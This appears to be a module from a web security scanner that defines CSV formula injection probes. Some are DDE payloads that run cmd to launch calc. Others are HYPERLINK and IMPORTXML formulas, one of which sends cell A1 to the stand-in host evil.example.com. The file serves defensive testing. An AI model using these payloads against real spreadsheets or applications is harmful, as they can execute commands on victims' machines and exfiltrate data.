// CSV formula injection (CSV injection / Excel injection) active check family.
import type { PayloadVariant } from '../types';

export const META = {
  id: 'csv-formula-injection',
  family: 'csv-formula-injection' as const,
  name: 'CSV Formula Injection',
  description: 'Detects CSV injection when user input appears in exported spreadsheets.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json'],
};

const CSV_PROBES = [
  { value: '=SUM(1+1)*cmd|" /C calc"!A0', intent: 'DDE command injection via SUM formula', signals: ['csv-injection'] },
  { value: '@SUM(1+1)*cmd|" /C calc"!A0', intent: 'DDE injection via @ prefix', signals: ['csv-injection'] },
  { value: '+SUM(1+1)*cmd|" /C calc"!A0', intent: 'DDE injection via + prefix', signals: ['csv-injection'] },
  { value: '-2+3+cmd|" /C calc"!A0', intent: 'Minus-prefix formula injection', signals: ['csv-injection'] },
  { value: '=HYPERLINK("http://evil.example.com/","Click")', intent: 'HYPERLINK formula leak', signals: ['csv-injection'] },
  { value: '=IMPORTXML(concat("http://evil.example.com/?x=",A1),"//a")', intent: 'IMPORTXML SSRF via formula', signals: ['csv-injection'] },
];

export function variants(): PayloadVariant[] {
  return CSV_PROBES.map((p, i) => ({ id: `csv-${i+1}`, family: 'csv-formula-injection' as const, value: p.value, encoding: 'raw' as const, intent: p.intent, requiresOast: false, requiresBrowser: false, destructiveRisk: 'none' as const, expectedSignals: p.signals }));
}
